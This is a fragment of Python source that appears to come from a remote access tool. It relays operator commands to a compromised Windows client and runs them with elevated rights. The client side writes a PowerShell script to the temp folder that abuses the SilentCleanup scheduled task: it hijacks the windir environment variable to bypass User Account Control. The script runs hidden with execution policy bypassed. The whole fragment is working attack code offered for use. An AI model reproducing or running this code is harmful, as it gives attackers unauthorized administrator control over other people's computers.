# priviliges escalation <might get blocked by the new updates of windows defender>
if isclient == False:
    if len(cmd.split()) >= 2:
        command = cmd.split()[1:]
        command = ' '.join(command)
        send(client, str(command).encode())
    else:
        print(Fore.LIGHTRED_EX + 'usage: privesc <command>' + Fore.RESET)
        send(client, b'OpErAtIoNcAnCeLeD')
else:
    class PriviligesEscalation():
        def run(command):
            code = '''
            if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
                ''' + command + '''
            '''
            code += r'''
            } else {
                $registryPath = "HKCU:\Environment"
                $Name = "windir"
                $Value = "powershell -ep bypass -w h $PSCommandPath;#"
                Set-ItemProperty -Path $registryPath -Name $name -Value $Value
                #Depending on the performance of the machine, some sleep time may be required before or after schtasks
                schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
                Remove-ItemProperty -Path $registryPath -Name $name
            }
            '''
            local_temp = os.getenv('temp')
            script = open(local_temp + '\\localscript.ps1', 'a')
            script.write(code)
            script.close()
            running = subprocess.Popen(r'powershell -ep Bypass ' + str(local_temp)  + '\\localscript.ps1')
            time.sleep(3)
    local_temp = os.getenv('temp')
    command = receive(server).decode()
    if command == 'OpErAtIoNcAnCeLeD':
        pass
    else:
        PriviligesEscalation.run(command)
        os.remove(str(local_temp)  + '\\localscript.ps1')